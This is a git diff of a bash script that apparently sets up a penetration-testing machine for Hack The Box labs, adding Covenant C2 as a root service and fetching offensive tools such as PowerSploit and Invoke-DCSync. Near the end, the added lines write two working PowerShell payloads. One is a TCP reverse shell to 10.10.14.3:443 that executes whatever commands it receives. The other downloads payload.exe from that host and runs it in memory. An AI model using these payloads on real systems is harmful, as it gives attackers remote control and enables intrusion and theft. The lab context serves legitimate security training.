@@ -400,7 +400,6 @@ echo -e "\n${GREEN}[*] ${RESET}Loading a bunch of additional tools into /opt/...
 cd /opt
 $SUDO git clone https://github.com/samratashok/ADModule
 $SUDO git clone https://github.com/BloodHoundAD/BloodHound
-$SUDO git clone https://github.com/cobbr/Covenant
 $SUDO git clone https://github.com/leebaird/discover
 $SUDO git clone https://github.com/elceef/dnstwist
 $SUDO git clone https://github.com/TheWover/donut
@@ -409,11 +408,73 @@ $SUDO git clone https://github.com/21y4d/nmapAutomator
 $SUDO git clone https://github.com/PowerShellMafia/PowerSploit
 $SUDO git clone https://github.com/NetSPI/PowerUpSQL
 $SUDO git clone https://github.com/GhostPack/Seatbelt
+$SUDO git clone https://github.com/cobbr/SharpGen       # setup requires cmd: `dotnet build`
 $SUDO git clone https://github.com/byt3bl33d3r/SprayingToolkit
 $SUDO git clone https://github.com/abatchy17/WindowsExploits
 
+# -- Covenant C2 Framework (requires dotnet) -------
+echo -e "\n${GREEN}[*] ${RESET}Installing the Covenant C2 Framework for advanced labs"
+$SUDO apt-get -y install libc6 libgcc1 libgssapi-krb5-2
+$SUDO apt-get -y install libicu67 || $SUDO apt-get -y install libicu63
+$SUDO apt-get -y install libssl1.1 libstdc++6 zlib1g
+# Install .NET Guide: https://docs.microsoft.com/en-us/dotnet/core/install/linux-debian#debian-10-
+cd /tmp
+wget https://packages.microsoft.com/config/debian/10/packages-microsoft-prod.deb \
+  -O packages-microsoft-prod.deb
+$SUDO dpkg -i packages-microsoft-prod.deb
+$SUDO apt-get -qq update
+$SUDO apt-get -y install apt-transport-https
+$SUDO apt-get -qq update
+$SUDO apt-get install -y dotnet-sdk-5.0
 
-[[ $(pip3 show autorecon) ]] || $SUDO python3 -m pip install git+https://github.com/Tib3rius/AutoRecon.git
+# Can disable auto collection of telemetry data to microsoft; put this in service file?
+export DOTNET_CLI_TELEMETRY_OPTOUT=1
+
+# Installing dev branch which is currently build on .NET SDK 5.0 (stable is on v3.1)
+cd /opt
+$SUDO git clone --recurse-submodules https://github.com/cobbr/Covenant -b dev
+if [[ $(which dotnet) ]]; then
+  cd Covenant/Covenant
+  $SUDO dotnet build
+  $SUDO dotnet publish -c Release
+  #$SUDO dotnet run
+  # First-run you will need to go to https://localhost:7443/ and create new user
+
+  # Setup a service for this: https://swimburger.net/blog/dotnet/how-to-run-a-dotnet-core-console-app-as-a-service-using-systemd-on-linux
+  #file_original="/opt/Covenant/Covenant/covenant.service"
+  file="/tmp/covenant.service"
+  cat <<EOF > "${file}"
+[Unit]
+Description=Covenant Service
+After=network.target
+
+[Service]
+Type=simple
+User=root
+WorkingDirectory=/opt/Covenant/Covenant
+ExecStart=/usr/bin/dotnet /opt/Covenant/Covenant/bin/Release/net5.0/publish/Covenant.dll
+Restart=on-failure
+
+Environment=DOTNET_CLI_TELEMETRY_OPTOUT=1
+
+[Install]
+WantedBy=default.target
+EOF
+# After copy, file should have permissions 0644 set automatically, but might want to verify
+$SUDO cp -u "${file}" /etc/systemd/system/covenant.service
+#$SUDO systemctl demon-reload
+#$SUDO systemctl start covenant
+#$SUDO systemctl enable covenant
+
+
+else
+  echo -e "${RED}[ERROR] dotnet command not found, install must have failed.${RESET}"
+  echo -e "${RED}\tGo here and fix:${RESET}  https://docs.microsoft.com/en-us/dotnet/core/install/linux-debian#debian-10-"
+  echo -e "${RED}\t Once fixed, in /opt/Covenant/Covenant dir, run:${RESET} dotnet build && dotnet run"
+fi
+
+
+[[ $(pip3 show autorecon 2>/dev/null) ]] || $SUDO python3 -m pip install git+https://github.com/Tib3rius/AutoRecon.git
 if [[ ! $(which autorecon) ]]; then
   cd /opt/
   $SUDO git clone https://github.com/Tib3rius/AutoRecon
@@ -429,7 +490,7 @@ fi
 
 # Custom nmap nse script to run CVE checks
 if [[ ! -f /usr/share/nmap/scripts/vulners.nse ]]; then
-  cd /tmp/
+  cd /tmp
   # NOTE: This repo has another "http-vulners-regex.nse" you can read up on
   $SUDO git clone https://github.com/vulnersCom/nmap-vulners
   $SUDO cp /tmp/nmap-vulners/vulners.nse /usr/share/nmap/scripts/
@@ -493,6 +554,21 @@ if [[ ! -f "${HTB_TRANSFERS}/Invoke-DCSync.ps1" ]]; then
   echo -e "\n${GREEN}[*] ${RESET}Downloading ${BOLD}Invoke-DCSync.ps1${RESET}"
   curl -SL 'https://gist.githubusercontent.com/HarmJ0y/4ced579bd21db02759a5/raw/724b2d528d7338fce6350190abbdbb32a967a53e/Invoke-DCSync.ps1' -o Invoke-DCSync.ps1
 fi
+
+file="shell-$USER.ps1"
+cat <<EOF > "${file}"
+$client = New-Object System.Net.Sockets.TCPClient("10.10.14.3",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "# ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+EOF
+
+file="exec-$USER.ps1"
+cat <<EOF > "${file}"
+$bytes = (new-object net.webclient).downloaddata("http://10.10.14.3:8000/payload.exe")
+[System.Reflection.Assembly]::Load($bytes)
+$BindingFlags = [Reflection.BindingFlags] "Nonpublic,Static"
+$main = [Shell].getmethod("Main", $BindingFlags)
+$main.Invoke($null, $null)
+EOF
+
 
 # -- Burpsuite -----------------------------------------------------------------
 echo -e "\n${GREEN}[*] ${RESET}Centralizing ${BOLD}Burpsuite${RESET} configs, extensions, libs, etc. into ${BURPSUITE_CONFIG_DIR}"
